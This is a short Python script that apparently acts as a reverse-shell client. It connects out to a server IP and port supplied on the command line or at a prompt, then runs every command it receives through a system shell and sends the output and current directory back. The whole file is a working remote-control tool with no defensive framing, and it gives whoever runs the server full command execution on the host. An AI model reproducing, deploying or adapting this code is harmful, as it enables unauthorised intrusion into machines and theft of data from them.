import socket
import os
import subprocess
import sys

SERVER = ''
PORT = 0

for i in range(len(sys.argv)):
    if i != 0: 
        if sys.argv[i] == "-p" or sys.argv[i] == "-h":
            pass
        elif sys.argv[i-1] == "-p":
            PORT = int(sys.argv[i])
        elif sys.argv[i-1]=="-h":
            SERVER = sys.argv[i]
        elif sys.argv[i] == "-dp":
            PORT = 9000
        elif sys.argv[i] == "-dh":
            SERVER = 'localhost'
        else:
            print(f"Unknown flag/argument '{sys.argv[i]}'")
            sys.exit()

while True:
    try:
        if SERVER == '':
            SERVER = input("Enter IP: ")
        if PORT == 0:
            PORT = int(input("Enter PORT: "))
        print(f"Trying to connect to IP: {SERVER} with PORT: {PORT} ")
        s = socket.socket()
        s.connect((SERVER, PORT))
        break

    except Exception as e:
        print(f"ERROR: {e}")
        ans = input("Do you want to reconnect(y/n): ")
        if ans == "n":
            sys.exit()

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))
        print(output_str)


s.close()